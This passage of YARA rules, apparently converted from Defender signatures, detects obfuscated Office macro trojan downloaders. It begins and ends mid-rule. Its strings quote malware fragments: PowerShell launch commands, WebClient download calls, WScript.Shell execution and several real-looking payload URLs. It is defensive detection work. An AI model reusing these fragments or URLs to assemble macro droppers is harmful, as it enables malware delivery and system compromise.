    strings:
        $x_1_1 = {33 7a 2e 66 69 2f 65 76 69 6c 31 2f 6c 61 75 6e 63 68 65 72 2e 70 73 31 22 2e 00 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 73 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = "savetofile Environ(\"PUBLIC\") & \"\\Documents\\launcher.ps1" ascii //weight: 1
        $x_1_3 = "= Now() + TimeValue(\"00:00:02\")" ascii //weight: 1
        $x_1_4 = "objWMIService.Get(\"Win32_ProcessStartup\")" ascii //weight: 1
        $x_1_5 = "powershell -executionpolicy remotesigned -File C:\\Users\\Public\\Documents\\launcher.ps1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RM_2147748025_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RM!MTB"
        threat_id = "2147748025"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= IsEmpty(\"\")" ascii //weight: 1
        $x_1_2 = "= IsNumeric(\"\")" ascii //weight: 1
        $x_1_3 = {2e 49 74 65 6d 28 29 2e 44 6f 63 75 6d 65 6e 74 2e 41 70 70 6c 69 63 61 74 69 6f 6e 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 [0-21] 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {52 65 70 6c 61 63 65 28 [0-37] 2c 20 22 [0-32] 22 2c 20 22 22 29 20 26 20 52 65 70 6c 61 63 65 28 [0-21] 2c 20 22 [0-21] 22 2c 20 22 22 29 20 5f}  //weight: 1, accuracy: Low
        $x_1_5 = {26 20 52 65 70 6c 61 63 65 28 [0-37] 2c 20 22 [0-37] 22 2c 20 22 22 29 20 26 20 22 22 20 26 20 22 22 20 26}  //weight: 1, accuracy: Low
        $x_1_6 = "& \"4" ascii //weight: 1
        $x_1_7 = "& \"3" ascii //weight: 1
        $x_1_8 = "& \"2" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (7 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RT_2147748459_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RT!MTB"
        threat_id = "2147748459"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_2 = "Call bc650879.exec(a779b2a8)" ascii //weight: 1
        $x_1_3 = "c:\\programdata\\preview.jpeg" ascii //weight: 1
        $x_1_4 = "db199cea.Open \"GET\", c4577dcf" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RT_2147748459_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RT!MTB"
        threat_id = "2147748459"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= IsNumeric(\"\")" ascii //weight: 1
        $x_1_2 = {2e 49 74 65 6d 28 29 2e 44 6f 63 75 6d 65 6e 74 2e 41 70 70 6c 69 63 61 74 69 6f 6e 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 [0-21] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = "& Replace(\"h\", \"h\", \"H\") _" ascii //weight: 1
        $x_1_4 = {3d 20 52 65 70 6c 61 63 65 28 [0-21] 2c 20 [0-21] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = "& \"4" ascii //weight: 1
        $x_1_6 = "& \"3" ascii //weight: 1
        $x_1_7 = "& \"2" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_CM_2147748557_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.CM!eml"
        threat_id = "2147748557"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "eml: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {20 3d 20 52 65 70 6c 61 63 65 28 [0-25] 2c 20 [0-20] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = ".Item().Document.Application.ShellExecute" ascii //weight: 1
        $x_1_3 = {28 56 61 6c 28 41 70 70 6c 69 63 61 74 69 6f 6e 2e 42 75 69 6c 64 29 20 41 6e 64 20 ?? ?? (28|30|2d|39|29) (28|30|2d|39|29) 20 3d 20 00 20 41 6e 64 20 [0-10] 29 20 54 68 65 6e}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 49 73 45 6d 70 74 79 28 [0-30] 29}  //weight: 1, accuracy: Low
        $x_1_5 = {26 20 22 22 20 26 20 22 22 20 26 20 52 65 70 6c 61 63 65 28 [0-26] 2c 20 22 [0-25] 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RW_2147748568_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RW!MTB"
        threat_id = "2147748568"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "SpecialPath = WshShell.SpecialFolders(\"Templates\")" ascii //weight: 1
        $x_1_2 = "Dim WshShell As Object" ascii //weight: 1
        $x_1_3 = ".Open \"get\"," ascii //weight: 1
        $x_1_4 = ".Status = 200 Then" ascii //weight: 1
        $x_1_5 = ".send" ascii //weight: 1
        $x_1_6 = {72 65 76 65 72 73 65 64 54 65 78 74 20 3d 20 72 65 76 65 72 73 65 64 54 65 78 74 20 26 20 4d 69 64 28 74 65 78 74 2c 20 28 6c 65 6e 67 74 68 20 2d 20 69 29 2c 20 31 29 [0-32] 4e 65 78 74 20 69}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_CF_2147748579_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.CF!eml"
        threat_id = "2147748579"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "eml: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 32 00 53 65 74 20 [0-15] 3d}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 52 65 70 6c 61 63 65 28 [0-15] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {49 66 20 4c 65 6e 28 22 [0-15] 22 29 20 3c 20 [0-5] 20 54 68 65 6e [0-3] 56 42 41 2e 43 61 6c 6c 42 79 4e 61 6d 65 20 [0-10] 2c 20 [0-11] 28 22 [0-10] 22 2c 20 22 [0-25] 22 2c 20 22 54 72 75 65 22 29 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {45 6e 64 20 49 66 [0-15] 3d 20 [0-10] 28 22 ?? ?? ?? ?? ?? ?? 22 2c 20 22 2f ?? ?? ?? ?? ?? ?? 67 ?? ?? ?? ?? ?? ?? 72 ?? ?? ?? ?? ?? ?? 6f ?? ?? ?? ?? ?? ?? 75 ?? ?? ?? ?? ?? ?? 70 ?? ?? ?? ?? ?? ?? 63 ?? ?? ?? ?? ?? ?? 72 ?? ?? ?? ?? ?? ?? 65 ?? ?? ?? ?? ?? ?? 61 ?? ?? ?? ?? ?? ?? 74 ?? ?? ?? ?? ?? ?? 65 ?? ?? ?? ?? ?? ?? 64 ?? ?? ?? ?? ?? ?? 22 2c 20 22 54 72 75 65 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = {45 6e 64 20 49 66 [0-15] 3d 20 [0-10] 28 22 ?? ?? ?? ?? 22 2c 20 22 74 ?? ?? ?? ?? 2e ?? ?? ?? ?? 61 ?? ?? ?? ?? 74 ?? ?? ?? ?? 2f ?? ?? ?? ?? 6d ?? ?? ?? ?? 69 ?? ?? ?? ?? 73 ?? ?? ?? ?? 61 ?? ?? ?? ?? 2e ?? ?? ?? ?? 62 ?? ?? ?? ?? 69 ?? ?? ?? ?? 6e ?? ?? ?? ?? 22 2c 20 22 54 72 75 65 22 29}  //weight: 1, accuracy: Low
        $x_1_6 = {45 6e 64 20 49 66 [0-15] 3d 20 [0-10] 28 22 ?? ?? ?? ?? 22 2c 20 22 24 ?? ?? ?? ?? 65 ?? ?? ?? ?? 6e ?? ?? ?? ?? 76 ?? ?? ?? ?? 3a ?? ?? ?? ?? 74 ?? ?? ?? ?? 65 ?? ?? ?? ?? 6d ?? ?? ?? ?? 70 ?? ?? ?? ?? 20 ?? ?? ?? ?? 2b ?? ?? ?? ?? 20 ?? ?? ?? ?? 27 ?? ?? ?? ?? 22 2c 20 22 54 72 75 65 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RU_2147748612_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RU!MTB"
        threat_id = "2147748612"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "DoWnloAdsTrInG" ascii //weight: 1
        $x_1_2 = {70 61 73 74 65 2e 65 65 2f 72 2f 76 35 65 38 45 1b 00 68 74 27 2b 27 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_3 = "Net.WebClient" ascii //weight: 1
        $x_1_4 = "wershell -Command" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RU_2147748612_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RU!MTB"
        threat_id = "2147748612"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= IsNumeric(\"\")" ascii //weight: 1
        $x_1_2 = {2e 49 74 65 6d 28 29 2e 44 6f 63 75 6d 65 6e 74 2e 41 70 70 6c 69 63 61 74 69 6f 6e 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 [0-21] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {22 26 48 22 [0-6] 26 20 4d 69 64 24}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 52 65 70 6c 61 63 65 28 22 [0-32] 26 48 [0-32] 22 2c}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 52 65 70 6c 61 63 65 28 [0-24] 2c 20 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_6 = "& \"4" ascii //weight: 1
        $x_1_7 = "& \"3" ascii //weight: 1
        $x_1_8 = "& \"2" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (7 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RY_2147748625_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RY!MTB"
        threat_id = "2147748625"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= IsArray(\"\")" ascii //weight: 1
        $x_1_2 = {3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 46 69 65 6c 64 73 2e 49 74 65 6d 28 [0-3] 29 2e 4f 4c 45 46 6f 72 6d 61 74 2e 4f 62 6a 65 63 74 2e 47 72 6f 75 70 4e 61 6d 65}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 49 74 65 6d 28 29 2e 44 6f 63 75 6d 65 6e 74 2e 41 70 70 6c 69 63 61 74 69 6f 6e 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 [0-32] 2c}  //weight: 1, accuracy: Low
        $x_1_4 = "\"C:\\Windows\\System32\", Null, 0 * 1" ascii //weight: 1
        $x_1_5 = {3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 50 61 72 61 67 72 61 70 68 73 28 [0-16] 29 2e 52 61 6e 67 65 2e 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_6 = "= \"\"" ascii //weight: 1
        $x_1_7 = "& \"7" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RX_2147748638_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RX!MTB"
        threat_id = "2147748638"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".Open \"get\", \"https://rocktrade.alphacode.mobi/uploads/bin_Protected.exe\", False" ascii //weight: 1
        $x_1_2 = "+ \"IGZKGBI.exe\"" ascii //weight: 1
        $x_1_3 = "= CreateObject(\"SHELL.APPLICATION\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RX_2147748638_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RX!MTB"
        threat_id = "2147748638"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 20 43 68 72 28 43 4c 6e 67 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 22 [0-24] 22 29 2e 56 61 6c 75 65 20 26 20 52 69 67 68 74 28 4c 65 66 74 28 [0-21] 2c 20 [0-21] 29 2c 20 32 29 29 20 2d 20 [0-2] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 22 [0-24] 22 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_3 = "Shell " ascii //weight: 1
        $x_1_4 = "Option Explicit" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RX_2147748638_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RX!MTB"
        threat_id = "2147748638"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "ystem.Net" ascii //weight: 1
        $x_1_2 = ".WebClient)\"" ascii //weight: 1
        $x_1_3 = ".DownloadFi\"" ascii //weight: 1
        $x_1_4 = {77 65 62 63 65 6e 74 65 72 62 72 61 73 69 6c 2e 63 6f 6d 2e 62 72 2f 73 65 6f 2f 76 68 66 32 2e 27 00 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_5 = "P\" + \"u\" + \"b\" + \"l\" + \"i\" + \"c%\\Microsoft.e" ascii //weight: 1
        $x_1_6 = "xe');Start-Proce\"" ascii //weight: 1
        $x_1_7 = "\"ss '%P\" + \"u\" + \"b\" + \"l\" + \"i\" + \"c\" + \"%\\M\" + \"i\" + \"c\" + \"r\" + \"o\" + \"s\" + \"o\" + \"f\" + \"t\" + \".e" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RZ_2147748736_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RZ!MTB"
        threat_id = "2147748736"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 20 43 68 72 28 43 49 6e 74 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 22 [0-24] 22 29 2e 56 61 6c 75 65 20 26 20 [0-24] 29 20 2d 20 [0-2] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 22 [0-24] 22 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_3 = "Shell " ascii //weight: 1
        $x_1_4 = "Option Explicit" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RZ_2147748736_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RZ!MTB"
        threat_id = "2147748736"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {63 2e 74 6f 70 34 74 6f 70 2e 69 6f 2f 70 5f 31 36 38 33 71 31 78 73 68 31 2e 6a 70 67 22 34 00 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 73 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = "Environ(\"AppDATA\")" ascii //weight: 1
        $x_1_3 = {2e 73 61 76 65 74 6f 66 69 6c 65 20 [0-5] 20 26 20 22 5c 61 76 67 2e 76 62 65 22}  //weight: 1, accuracy: Low
        $x_1_4 = "CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_5 = ".Run \"avg.vbe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SA_2147749079_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SA!MSR"
        threat_id = "2147749079"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_2 = "URLMON" ascii //weight: 1
        $x_1_3 = {68 74 74 70 73 3a 2f 2f 61 70 65 72 66 6f 72 72 6d 69 6e 67 6e 65 78 74 79 6f 75 2e 78 79 7a 2f [0-7] 2f [0-3] 2e 64 6c 6c}  //weight: 1, accuracy: Low
        $x_1_4 = {43 3a 5c 6b 66 55 6f 66 57 6a 5c [0-7] 5c [0-7] 2e 64 6c 6c 20 44 6c 6c 52 65 67 69 73 74 65 72 53 65 72 76 65 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SA_2147749079_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SA!MSR"
        threat_id = "2147749079"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {78 48 74 74 70 2e 4f 70 65 6e [0-34] 43 68 72 57 28 31 30 34 29 20 26 20 43 68 72 57 28 31 31 36 29 20 26 20 43 68 72 57 28 31 31 36 29 20 26 20 43 68 72 57 28 31 31 32 29 20 26 20 43 68 72 57 28 35 38 29 20 26 20 43 68 72 57 28 34 37 29 20 26 20 43 68 72 57 28 34 37 29 20 26 20 43 68 72 57 28 34 39 29 20 26 20 43 68 72 57 28 35 31 29 20 26 20 43 68 72 57 28 35 31 29 20 26 20 43 68 72 57 28 34 36 29 20 26 20 43 68 72 57 28 34 39 29 20 26 20 43 68 72 57 28 35 36 29 20 26 20 43 68 72 57 28 34 36 29 20 26 20 43 68 72 57 28 34 39 29 20 26 20 43 68 72 57 28 35 34 29 20 26 20 43 68 72 57 28 35 37 29 20 26 20 43 68 72 57 28 34 36 29 20 26 20 43 68 72 57 28 35 37 29}  //weight: 1, accuracy: Low
        $x_1_2 = {53 68 65 6c 6c 20 28 [0-50] 43 68 72 57 28 34 36 29 20 26 20 43 68 72 57 28 31 30 31 29 20 26 20 43 68 72 57 28 31 32 30 29 20 26 20 43 68 72 57 28 31 30 31 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = "savetofile" ascii //weight: 1
        $x_1_4 = "xHttp.Send" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SA_2147749181_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SA!MTB"
        threat_id = "2147749181"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox" ascii //weight: 1
        $x_1_2 = "Set objStartup = CreateObject(\"winmgmts:Win32_ProcessStartup\")" ascii //weight: 1
        $x_1_3 = "= oProcess.Methods_(\"Create\"). _" ascii //weight: 1
        $x_1_4 = "At (p.Value)" ascii //weight: 1
        $x_1_5 = "Worksheets(1).Activate" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SB_2147749281_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SB!MTB"
        threat_id = "2147749281"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= IsEmpty(\"\")" ascii //weight: 1
        $x_1_2 = "= IsNumeric(\"\")" ascii //weight: 1
        $x_1_3 = {2e 49 74 65 6d 28 29 2e 44 6f 63 75 6d 65 6e 74 2e 41 70 70 6c 69 63 61 74 69 6f 6e 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 [0-21] 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 52 65 70 6c 61 63 65 28 [0-37] 2c 20 [0-37] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = "& \"4" ascii //weight: 1
        $x_1_6 = "& \"3" ascii //weight: 1
        $x_1_7 = "& \"2" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SB_2147749281_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SB!MTB"
        threat_id = "2147749281"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 61 70 74 69 6f 6e 20 3d 20 [0-16] 28 32 2c 20 22 [0-64] 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 54 61 67 20 3d 20 [0-16] 2e 43 61 70 74 69 6f 6e 20 2b 20 [0-16] 28 33 2c 20 22 [0-64] 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {4f 70 65 6e 20 [0-16] 2e 54 61 67 20 46 6f 72 20 42 69 6e 61 72 79 20 41 73 20 23 31}  //weight: 1, accuracy: Low
        $x_1_4 = {44 6f 20 57 68 69 6c 65 20 44 69 72 28 [0-16] 28 35 2c 20 22 [0-80] 22 29 2c 20 76 62 44 69 72 65 63 74 6f 72 79 29 20 3d 20 22 22}  //weight: 1, accuracy: Low
        $x_1_5 = "aHR0cDovLz" ascii //weight: 1
        $x_1_6 = ".Tag <> \"stage\" Then" ascii //weight: 1
        $x_1_7 = {2e 43 61 70 74 69 6f 6e 20 3c 3e 20 22 61 70 70 6c 65 22 20 54 68 65 6e 20 4f 70 65 6e 20 [0-21] 2e 54 61 67 20 46 6f 72 20 42 69 6e 61 72 79 20 41 73 20 23 33}  //weight: 1, accuracy: Low
        $x_1_8 = "Declare Function SetProcessWindowStation Lib \"user32\" (ByVal hWinSta As Long) As Boolean" ascii //weight: 1
        $x_1_9 = {3d 20 53 68 65 6c 6c 28 [0-16] 2c 20 [0-16] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RO_2147749502_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RO!MTB"
        threat_id = "2147749502"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Val(\"&H\" & (Mid$(" ascii //weight: 1
        $x_1_2 = "1) = Chr(Asc(Mid(" ascii //weight: 1
        $x_1_3 = {2e 52 75 6e 20 22 22 20 2b 20 [0-96] 20 2b 20 22 20 22 20 2b}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 52 65 70 6c 61 63 65 28 [0-96] 2c 20 22}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 31 20 54 6f 20 4c 65 6e 28 [0-96] 29 [0-21] 4d 69 64}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RO_2147749502_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RO!MTB"
        threat_id = "2147749502"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
